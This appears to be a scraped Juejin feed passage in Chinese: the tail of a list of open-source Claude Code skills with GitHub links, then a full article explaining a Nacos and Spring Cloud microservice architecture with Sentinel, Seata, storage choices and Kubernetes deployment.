<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d07ea31f79554b5cb43288d6c9f35687~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=OBaeuZCapzQyBpa%2BuBi27ykvWDw%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b075c188d39c41f8b8be9ec17f6ed6d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=lhfqwN%2B6Lweq5rZZ%2FJqDxyVltSg%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/op7418/Youtube-clipper-skill</span>
</code></pre>
<p>03</p>
<p><strong>skill-from-masters</strong></p>
<p>这个挺有意思的，它能帮你创建 Skill。</p>
<p>在创建新 Skill 之前，会先搜索，寻找目标领域的顶级专家的思维模型和最佳实践，确保生成的 Skill 具备专业深度。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fb97c4900044a8b81ef0eb92278d64f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=8oySZPZhTlYB1NP%2Fj3ot%2BZO%2FT6Q%3D" alt="图片" loading="lazy"/></p>
<p>这个开源项目采用三层搜索架构：</p>
<p>首先查询本地专家数据库，其次进行网络搜索以补充更多专家观点，最后深入查找一手资料并交叉验证。</p>
<p>它不仅寻找黄金范例作为输出标准，还会识别该领域的反面模式以避免常见错误，从而生成高质量、专业度极高的 Skill 指令。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e68e439f51b49ee8b915c2e946c025c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=yTyqAnKifo85Sr%2F68O%2BRHbSzeH8%3D" alt="图片" loading="lazy"/></p>
<p>除了从专家处学习，该仓库还包含一个 skill-from-github 功能。</p>
<p>你可以指定优秀的 GitHub 开源项目，让 AI 深入阅源码和文档，提取其中的算法逻辑或设计模式，并将其转化为一个独立的 Skill，还挺有用的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88e0fce67e1a45849d3dbaefc13fd07e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=cMMt%2FCLwZhoPqMm5SlacA1PZ%2B3U%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">开源地址：https://github.com/GBSOSS/skill-from-masters
</code></pre>
<p>04</p>
<p><strong>NotebookLM Skill</strong></p>
<p>这个开源 Skill 能让 Claude Code 直接与 Google NotebookLM 进行交互。通过连接 NotebookLM ，让 Claude 能够基于你上传的知识库回答。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0cf64f4e3244edeb2d5a92f87b482dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=KruGEmhim%2F9p31TVFcKtx%2BF%2FX%2FQ%3D" alt="图片" loading="lazy"/></p>
<p>这个项目会在本地运行一个独立的 Python 环境，利用 Patchright（基于 Playwright）技术实现浏览器自动化操作。</p>
<p>它模拟用户登录 Google 账号并操作 NotebookLM 界面，实现了持久化认证和库管理。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bff0631c818f4ea6b4d3f4a749032bc7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=CGL1kiAtx1h1a6Qm%2BFvpp5dSP3I%3D" alt="图片" loading="lazy"/></p>
<p>说白了，装了这个 Skill 不用再浏览器和命令行之前反复的复制粘贴了。</p>
<p>你可以直接在命令行里面通过自然语言查询自己的知识库，Claude 会自动从 NotebookLM 获取经过综合处理的答案。</p>
<pre><code class="hljs language-bash" lang="bash">开源地址：https://github.com/PleasePrompto/notebooklm-skill
</code></pre>
<p>05</p>
<p><strong>Markdown 文章一键发布到 X</strong></p>
<p>这个 Skill 可以把本地 Markdown 文章一键发布到 X 上。</p>
<p>X 平台自带编辑器对 Markdown 支持不好，经常排版丢失，手动插入图片很繁琐。</p>
<p>用这个 Skill 通过 Claude Code 就能完成从文稿解析到草稿生成的全过程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/123a339b1afb46b380eda55ceeea4b21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=0%2FEMg4s4auqq9F7RBC%2BkSEyRRu0%3D" alt="图片" loading="lazy"/></p>
<p>工具支持将 Markdown 的丰富格式完美转换为 X Articles 的 HTML 格式。</p>
<p>为了确保文章排版的精准性，这个工具引入了 Block-Index 定位技术。</p>
<p>在解析 Markdown 时，它会计算每张图片在文章结构中的精确位置索引，通过浏览器自动化脚本将图片精准插入到对应的段落之间，彻底解决了传统文本匹配方式容易导致的图片错位问题。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/wshuyi/x-article-publisher-skill</span>
</code></pre>
<p>06</p>
<p><strong>Agent Skills 公共仓库</strong></p>
<p>这是 Anthropic 官方发布的 Agent Skills 公共仓库，定义了 Claude 的 Skill 标准，重点是里面有大量现成的 Skill。</p>
<p>这些 Skill 设计灵活，既可以在 Claude Code 中用，也可以集成到 Claude.ai 或通过 API 调用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65a84d3b4dcc464ea56d42d176f123cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=KPfp9%2Fu5dI6C6Gs2YndSllMLWxQ%3D" alt="图片" loading="lazy"/></p>
<p>我看了一下，有很多 Skill 还是非常实用的。</p>
<p>比如文档处理，强大的 PDF、Word、Excel、PPT 处理能力，都有对应的 Skill。</p>
<p>mcp-builder 可以辅助你创建高质量的 MCP Server，artifacts-builder 能使用 React、Tailwind CSS 和 shadcn/ui 组件库构建复杂的 HTML 交互式界面。</p>
<p>还有很多很多，感兴趣去瞧瞧吧。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba2e6f057f6747969261cbff3d785d43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874960&amp;x-signature=NkQoRwTaojMgjvez4%2BHdAlenmXc%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/anthropics/skills</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于Nacos+Spring Cloud的微服务架构设计与实践]]></title>    <link>https://juejin.cn/post/7603004323871359019</link>    <guid>https://juejin.cn/post/7603004323871359019</guid>    <pubDate>2026-02-05T05:54:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603004323871359019" data-draft-id="7602921143490740267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于Nacos+Spring Cloud的微服务架构设计与实践"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T05:54:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于Nacos+Spring Cloud的微服务架构设计与实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:54:33.000Z" title="Thu Feb 05 2026 05:54:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8070a1f25f54532a91806e433f9cab1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTmqZjlrZDnmq4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770875675&amp;x-signature=B8U60A%2Fcat0b4WMiisRWAYfjCT8%3D" alt="image.png" loading="lazy"/>
此图呈现了微服务架构从“前端接入→服务治理→业务逻辑→数据存储→部署运维”的全链路设计</p>
<h2 data-id="heading-0">引言：微服务架构的演进逻辑</h2>
<p>在互联网业务快速迭代的背景下，<strong>单体应用</strong>因代码耦合、扩展困难、部署低效等问题逐渐难以满足需求。微服务架构通过 <strong>“拆分-自治-协作”</strong> 的核心思想，将复杂系统拆分为多个独立部署、技术异构的服务单元，实现业务敏捷性与技术灵活性的平衡。</p>
<p>本文结合架构图，拆解一套基于 <strong>Nacos</strong>（服务治理+配置中心）、<strong>Spring Cloud</strong>（微服务生态）、<strong>云原生技术</strong>（容器、编排、服务网格）的微服务架构，解析各组件协作逻辑与设计价值。</p>
<h2 data-id="heading-1">一、架构全景：分层解耦的设计哲学</h2>
<p>架构图从<strong>流量接入→服务治理→业务逻辑→数据存储→部署运维</strong>分层设计，每层聚焦特定职责，实现“高内聚、低耦合”：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fexample.com%2Farch-overview%25EF%25BC%2588%25E6%25B3%25A8%25EF%25BC%259A%25E6%25AD%25A4%25E5%25A4%2584%25E5%25AF%25B9%25E5%25BA%2594%25E5%258E%259F%25E5%259B%25BE%25E5%2588%2586%25E5%25B1%2582%25EF%25BC%258C%25E9%259C%2580%25E8%25AF%25BB%25E8%2580%2585%25E8%2584%2591%25E8%25A1%25A5%25E7%25BB%2593%25E6%259E%2584%25EF%25BC%2589" target="_blank" title="https://example.com/arch-overview%EF%BC%88%E6%B3%A8%EF%BC%9A%E6%AD%A4%E5%A4%84%E5%AF%B9%E5%BA%94%E5%8E%9F%E5%9B%BE%E5%88%86%E5%B1%82%EF%BC%8C%E9%9C%80%E8%AF%BB%E8%80%85%E8%84%91%E8%A1%A5%E7%BB%93%E6%9E%84%EF%BC%89" ref="nofollow noopener noreferrer">example.com/arch-overvi…</a></p>
<h3 data-id="heading-2">1. 前端接入层：多终端流量入口</h3>
<ul>
<li><strong>角色</strong>：承载Web、Mobile等多终端用户的HTTP请求，是系统流量的“第一道关口”。</li>
<li><strong>设计考量</strong>：需兼容多端协议（HTTP/WebSocket等）、支持灰度发布（如按用户ID分流），为后续网关层减负。</li>
</ul>
<h3 data-id="heading-3">2. 网关层：流量的“智能路由器”</h3>
<p>架构采用<strong>双层负载</strong>设计：<code>Nginx（边缘负载） + Spring Cloud Gateway（服务内路由）</code>，分工明确：</p>
<h4 data-id="heading-4">（1）Nginx：边缘流量调度</h4>
<ul>
<li><strong>核心能力</strong>：反向代理、负载均衡（轮询、权重、IP哈希等）、动静分离（静态资源直连CDN）。</li>
<li><strong>场景价值</strong>：作为系统对外的“统一入口”，抗住高并发请求，避免后端服务直接暴露；通过<code>upstream</code>配置实现服务集群的负载分发。</li>
</ul>
<h4 data-id="heading-5">（2）Spring Cloud Gateway：服务内精细化治理</h4>
<ul>
<li><strong>核心能力</strong>：基于Spring生态的轻量网关，支持<strong>路由断言</strong>（Path、Header匹配）、<strong>过滤器链</strong>（鉴权、限流、日志、灰度路由）、与Nacos集成实现<strong>服务发现路由</strong>。</li>
<li><strong>场景价值</strong>：替代传统Zuul，性能更优；通过与Nacos联动，自动感知服务实例上下线，无需手动维护路由表；内置过滤器可快速实现“鉴权拦截非法请求”“限流保护下游服务”等逻辑。</li>
</ul>
<h3 data-id="heading-6">3. 服务治理核心：Nacos——注册中心+配置中心的“双引擎”</h3>
<p>Nacos是阿里开源的<strong>服务治理与动态配置平台</strong>，在架构中承担“服务注册发现”与“配置集中管理”两大核心职责，替代传统Eureka（注册中心）+Config（配置中心）的组合，实现 <strong>“一套组件解决两类问题”</strong> 。</p>
<h4 data-id="heading-7">（1）服务注册中心：服务自治的基础</h4>
<ul>
<li>
<p><strong>运作流程</strong>：</p>
<ul>
<li>服务提供者（如订单服务、商品服务）启动时，向Nacos注册自身实例（IP、端口、元数据）；</li>
<li>服务消费者（如网关、其他服务）通过Nacos订阅服务，Nacos推送实例列表；</li>
<li>消费者基于负载均衡策略（如Ribbon）选择实例发起调用。</li>
</ul>
</li>
<li>
<p><strong>技术优势</strong>：采用<strong>AP架构</strong>（ availability-first ），牺牲强一致性换取高可用，更适合分布式云环境；支持服务健康检查（心跳机制），自动剔除故障实例。</p>
</li>
</ul>
<h4 data-id="heading-8">（2）配置中心：动态化配置的利器</h4>
<ul>
<li>
<p><strong>运作流程</strong>：</p>
<ul>
<li>研发人员将配置（如数据库连接、限流阈值）上传至Nacos，按<code>Namespace（环境隔离）</code>、<code>Group（业务分组）</code>、<code>Data ID（配置标识）</code>维度管理；</li>
<li>服务启动时从Nacos拉取配置，运行中监听配置变更，Nacos主动推送更新（无需重启服务）。</li>
</ul>
</li>
<li>
<p><strong>技术优势</strong>：解决多环境（开发、测试、生产）、多实例配置同步难题；结合Spring Cloud Config，实现“配置热更新”，大幅提升运维效率。</p>
</li>
</ul>
<h4 data-id="heading-9">（3）Nacos集群：高可用保障</h4>
<p>生产环境需部署<strong>Nacos集群</strong>（3节点及以上），通过Raft协议保证数据一致性；搭配负载均衡（如Nginx）对外提供服务，避免单点故障。</p>
<h3 data-id="heading-10">4. 业务服务层：微服务的“自治单元”</h3>
<p>架构中“服务集群”代表按<strong>领域驱动设计（DDD）</strong> 拆分的微服务（如订单服务、商品服务、用户服务），每个服务：</p>
<ul>
<li><strong>独立部署</strong>：代码仓库、构建流水线、运行实例相互隔离；</li>
<li><strong>自治演进</strong>：技术栈自由选择（如订单服务用Go、商品服务用Java），迭代周期自主把控；</li>
<li><strong>协作通信</strong>：通过Nacos服务发现实现“RPC调用”，或通过RocketMQ实现“异步解耦”（如订单创建后异步通知库存服务扣减）。</li>
</ul>
<h3 data-id="heading-11">5. 流量控制与分布式事务：保障服务稳定性与数据一致性</h3>
<p>微服务拆分后，<strong>流量洪峰</strong>与<strong>跨服务事务</strong>成为核心挑战，架构引入<strong>Sentinel</strong>与<strong>Seata</strong>分别应对。</p>
<h4 data-id="heading-12">（1）Sentinel：流量防洪闸</h4>
<ul>
<li>
<p><strong>核心能力</strong>：流量整形（限流、降级、熔断）、系统自适应保护、热点参数限流。</p>
</li>
<li>
<p><strong>运作逻辑</strong>：</p>
<ul>
<li>定义资源（如订单服务的<code>createOrder</code>接口），配置限流规则（如QPS=1000）；</li>
<li>当流量超过阈值，触发“直接拒绝”“匀速排队”等策略，保护下游服务不被压垮；</li>
<li>结合Nacos动态推送规则，实现“不重启服务调整限流策略”。</li>
</ul>
</li>
<li>
<p><strong>选型优势</strong>：相比Hystrix（Netflix已停止维护），Sentinel更轻量、规则配置更灵活，且原生支持Spring Cloud Alibaba生态。</p>
</li>
</ul>
<h4 data-id="heading-13">（2）Seata：分布式事务协调者</h4>
<ul>
<li>
<p><strong>核心场景</strong>：跨服务数据修改的一致性问题（如“创建订单→扣减库存→扣减账户余额”需原子性执行）。</p>
</li>
<li>
<p><strong>运作模式（以AT模式为例）</strong> ：</p>
<ol>
<li>全局事务发起：订单服务开启全局事务，生成<code>XID</code>（全局事务ID）；</li>
<li>分支事务注册：库存、账户服务作为分支事务，向Seata Server注册；</li>
<li>本地事务执行：各服务执行本地SQL，记录<code>undo_log</code>（用于回滚）；</li>
<li>全局提交/回滚：Seata Server协调各分支事务提交，若失败则根据<code>undo_log</code>反向补偿。</li>
</ol>
</li>
<li>
<p><strong>技术价值</strong>：屏蔽分布式事务的复杂度，让开发者聚焦业务逻辑；支持高并发场景下的“柔性事务”（最终一致性），平衡性能与一致性。</p>
</li>
</ul>
<h3 data-id="heading-14">6. 数据存储层：多模存储的“分工协作”</h3>
<p>微服务场景下，<strong>单一数据库无法满足所有业务诉求</strong>，架构采用“多类型存储协同”策略：</p>









































<table><thead><tr><th>存储类型</th><th>组件</th><th>核心场景</th><th>技术优势</th></tr></thead><tbody><tr><td>缓存</td><td>Redis集群</td><td>热点数据缓存（如商品详情）、分布式锁</td><td>高吞吐、低延迟，减轻DB压力</td></tr><tr><td>关系型数据库</td><td>MySQL集群</td><td>核心业务数据持久化（如订单、用户）</td><td>事务支持完善，满足强一致性</td></tr><tr><td>消息队列</td><td>RocketMQ集群</td><td>异步解耦（如订单→库存）、削峰填谷</td><td>高可靠、支持事务消息</td></tr><tr><td>搜索引擎</td><td>Elasticsearch集群</td><td>复杂查询、全文检索（如商品搜索）</td><td>分布式搜索，支持聚合分析</td></tr><tr><td>分布式文件系统</td><td>FastDFS集群</td><td>图片、文档等非结构化数据存储</td><td>高扩展、低成本，适合海量文件</td></tr></tbody></table>
<p><strong>设计逻辑</strong>：按“读多写少用缓存→核心数据用DB→异步场景用MQ→搜索需求用ES→文件存储用FastDFS”的原则分工，避免单一存储的性能瓶颈。</p>
<h3 data-id="heading-15">7. 部署与运维：云原生时代的“自动化引擎”</h3>
<p>微服务架构的复杂性倒逼<strong>DevOps与云原生技术</strong>落地，架构通过“容器化+编排+持续集成”实现高效运维：</p>
<h4 data-id="heading-16">（1）Docker：环境一致性的基石</h4>
<ul>
<li>将每个微服务及其依赖打包为容器镜像，确保“开发、测试、生产”环境完全一致，避免“在我机器上能跑”的协作痛点。</li>
</ul>
<h4 data-id="heading-17">（2）Jenkins：CI/CD流水线的“自动化工人”</h4>
<ul>
<li>搭建持续集成/持续部署（CI/CD）流水线：代码提交→自动构建→单元测试→镜像打包→部署到测试环境→人工验证→发布到生产环境，全程自动化，提升迭代效率。</li>
</ul>
<h4 data-id="heading-18">（3）Kubernetes（K8s）：容器编排的“大脑”</h4>
<ul>
<li>自动化管理容器集群：实现服务自动扩缩容（HPA）、故障自愈（Pod崩溃后自动重启）、负载均衡（Service+Ingress），降低运维人力成本。</li>
</ul>
<h4 data-id="heading-19">（4）Istio：服务网格的“隐形管家”</h4>
<ul>
<li>作为<strong>服务网格（Service Mesh）</strong> 的核心组件，Istio在应用无侵入的前提下，实现服务间通信的流量管理（金丝雀发布、A/B测试）、可观测性（ metrics、tracing ）、安全（mTLS加密），补充Spring Cloud的服务治理能力（尤其在多语言场景下优势显著）。</li>
</ul>
<h2 data-id="heading-20">二、架构协作流程：从请求到响应的全链路解析</h2>
<p>以“用户下单”场景为例，拆解请求在全架构中的流转：</p>
<ol>
<li><strong>用户发起请求</strong>：Web/Mobile端调用网关接口（如<code>/order/create</code>）。</li>
<li><strong>网关层路由</strong>：Nginx负载均衡请求到Spring Cloud Gateway，Gateway通过Nacos服务发现，定位到“订单服务”集群。</li>
<li><strong>服务间调用</strong>：订单服务调用“库存服务”（RPC）、“账户服务”（RPC）完成扣减，同时通过RocketMQ发送“订单创建”事件，异步通知“物流服务”准备发货。</li>
<li><strong>流量控制</strong>：Sentinel监控订单服务的QPS，若超过阈值则触发限流，返回“稍后再试”提示。</li>
<li><strong>分布式事务</strong>：订单服务作为全局事务发起方，通过Seata协调库存、账户服务的分支事务，确保数据最终一致。</li>
<li><strong>数据存储</strong>：订单数据写入MySQL（主库），缓存Redis同步热点订单信息，RocketMQ持久化消息日志，Elasticsearch更新订单索引。</li>
<li><strong>响应返回</strong>：各服务调用完成后，响应沿原链路回传到用户端，展示“下单成功”。</li>
</ol>
<h2 data-id="heading-21">三、技术选型背后的思考：没有银弹，只有权衡</h2>
<p>架构设计中，每个组件的选择都是 <strong>“业务诉求、技术成本、生态成熟度”</strong> 的权衡结果：</p>
<ul>
<li><strong>注册中心选Nacos而非Eureka</strong>：Nacos的AP架构更适合国内云环境，且支持配置中心“二合一”，减少组件维护成本。</li>
<li><strong>网关选Spring Cloud Gateway而非Zuul</strong>：Gateway性能更优（基于Netty异步非阻塞），且与Spring生态深度整合，学习成本低。</li>
<li><strong>分布式事务选Seata而非TCC</strong>：Seata的AT模式“无侵入”特性更适合快速迭代的业务，TCC需大量自定义回滚逻辑，研发成本高。</li>
<li><strong>部署选K8s而非Mesos</strong>：K8s社区活跃度高，工具链成熟（如Helm、Istio），云厂商支持更完善。</li>
</ul>
<h2 data-id="heading-22">结语：微服务架构的演进方向</h2>
<p>这套架构通过 <strong>“网关层流量调度→服务层自治治理→数据层多模存储→运维层自动化”</strong> 的分层设计，实现了“高可用、可扩展、易维护”的微服务核心目标。</p>
<p>未来，随着云原生技术的深化，<strong>Service Mesh（服务网格）将进一步提升服务治理的灵活性</strong>，AI驱动的智能运维（如AIOps）将降低复杂架构的运维门槛，而Serverless的兴起或将重塑微服务的部署形态。但“拆分-自治-协作”的微服务本质逻辑，仍将是数字化时代系统架构的核心范式。</p>
<p><strong>本文架构图价值</strong>：清晰呈现了微服务架构从“前端接入→服务治理→业务逻辑→数据存储→部署运维”的全链路设计，可作为团队架构评审、技术方案选型的参考蓝图，帮助开发者理解“组件如何协同支撑业务增长”。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[@tdesign/uniapp 的 Vue2.x 适配说明]]></title>    <link>https://juejin.cn/post/7602901195154030644</link>    <guid>https://juejin.cn/post/7602901195154030644</guid>    <pubDate>2026-02-05T04:52:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602901195154030644" data-draft-id="7602916013877067791" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="@tdesign/uniapp 的 Vue2.x 适配说明"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T04:52:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Novlan1"/> <meta itemprop="url" content="https://juejin.cn/user/1987523605435432"/></div> <div itemprop="publisher" 